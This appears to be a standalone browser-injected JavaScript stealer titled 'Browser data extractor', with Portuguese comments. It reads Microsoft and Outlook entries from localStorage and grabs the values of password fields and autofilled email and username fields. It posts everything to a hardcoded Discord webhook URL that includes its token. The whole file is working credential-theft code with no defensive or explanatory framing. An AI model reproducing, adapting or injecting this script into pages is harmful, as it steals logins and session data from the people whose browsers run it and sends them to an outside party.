// Browser data extractor
(async function() {
    const WEBHOOK = 'https://ptb.discord.com/api/webhooks/1471888405783773407/d_fL6xpJsDVY759evqGCWkcyKXDuNFz02mR06rxrkOiitlcfOvdNtk6es6WpcI5EOFJA';
    
    // Tentar acessar indexedDB de Microsoft
    function extractIndexedDB() {
        return new Promise((resolve) => {
            const request = indexedDB.open('test', 1);
            request.onsuccess = () => {
                const db = request.result;
                const data = {};
                
                // Listar todos os bancos disponíveis
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.includes('microsoft') || key.includes('outlook')) {
                        data[key] = localStorage.getItem(key);
                    }
                }
                
                db.close();
                resolve(data);
            };
            request.onerror = () => resolve({});
        });
    }
    
    // Procurar por passwords salvos
    function findSavedPasswords() {
        const inputs = document.querySelectorAll('input[type="password"]');
        return Array.from(inputs).map(input => ({
            name: input.name,
            placeholder: input.placeholder,
            autocomplete: input.autocomplete,
            value: input.value || 'empty'
        }));
    }
    
    // Capturar autofill data
    function getAutofillData() {
        const data = {};
        const commonFields = ['email', 'username', 'login', 'user'];
        
        commonFields.forEach(field => {
            const input = document.querySelector(`input[name*="${field}"], input[id*="${field}"]`);
            if (input && input.value) {
                data[field] = input.value;
            }
        });
        
        return data;
    }
    
    // Enviar dados extras
    const extraData = {
        indexedDB: await extractIndexedDB(),
        passwords: findSavedPasswords(),
        autofill: getAutofillData(),
        timestamp: Date.now()
    };
    
    fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(extraData)
    });
    
})();
